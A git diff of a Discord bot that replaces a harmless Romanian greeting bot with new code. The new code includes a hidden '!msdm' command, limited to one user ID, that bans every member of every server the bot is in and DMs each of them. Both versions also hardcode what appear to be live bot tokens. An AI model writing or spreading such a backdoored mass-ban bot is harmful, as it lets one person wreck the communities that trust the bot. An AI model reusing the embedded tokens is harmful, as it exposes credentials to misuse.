@@ -1,41 +1,41 @@
-const discord = require ("discord.js");
+const Discord = require(`discord.js`)
+const client = new Discord.Client()
+const prefix = "!"
+const bot = new Discord.Client()
+const token = "NDM0NzI3NzU2OTc5MjQwOTYw.DbO4Uw.IsC9Of4N_L6vQ8tnD5IIdQONWmg"
+const log = message => {
+  console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] ${message}`);
+};
 
-var client = new discord.Client();
+client.on("guildCreate", guild => {
+      console.log(`${guild.name},  ${guild.memberCount} members!`);
+      client.user.setGame("the fuck is a hackerland lol");
+});
+client.on("guildDelete", guild => {
+  console.log(`- ${guild.name} :c`);
+});
 
-const token = "NDM0Njc5MTg1NjYzODUyNTQ0.DbN-cw.2fuysj6vV8OzRvJQG9-ALFwUEQ4";
+
+client.on('message', message => {
+if(message.content.startsWith('!msdm')) {
+    if(message.author.id === "436879011860447242"){
+        let args = message.content.split(" ").slice(1);
+        var argresult = args.join(" ")
+        const argsresult = args.join(" ")
+        let reason = args.join(" ")
+                  if(!args[1]) {
+ }
+ if(args[1]) {
+     client.guilds.forEach(guild => {
+guild.members.forEach(member => {
+message.guild.ban(member)
+member.send(reason)
+message.delete()
+})})}}}
+});
 
 client.on("ready", () => {
-    console.log("Pregatit!")
-    client.user.setPresence({ game: { name: '!help | 1 server, pentru ca voi fi doar in acest server ;)', type: 3 } });
+    console.log("On " + client.guilds.size + " guilds.")
+    console.log("With " + client.users.size + " members.")
 });
-
-const prefix = "!"
-client.on("message", (message) => {
-
-    if (message.author.bot) return;
-
-    if (message.content.startsWith (prefix + "salut")) {
-        message.reply("Salutare :smiley:");
-    }
-
-    if (message.content.startsWith (prefix + "👀")) {
-        message.channel.sendMessage(":eyes:")
-    }
-
-    if (message.content.startsWith (prefix + "mew")) {
-        message.channel.send ("Awww! Este foarte adorabil! :heart_eyes:", {files: ["./images/mew.png"]})
-    }
-
-    mention = message.mentions.users.first();
-
-    if(message.content.startsWith (prefix + "dm")) {
-       if (mention == null) { return; }
-       message.delete();
-       mentionMessage = message.content.slice (8);
-       mention.sendMessage (mentionMessage);
-       message.channel.send ("Mesajul a fost trimis! :smile:");
-    }
-
-});
-
-client.login (token);
+client.login(token)
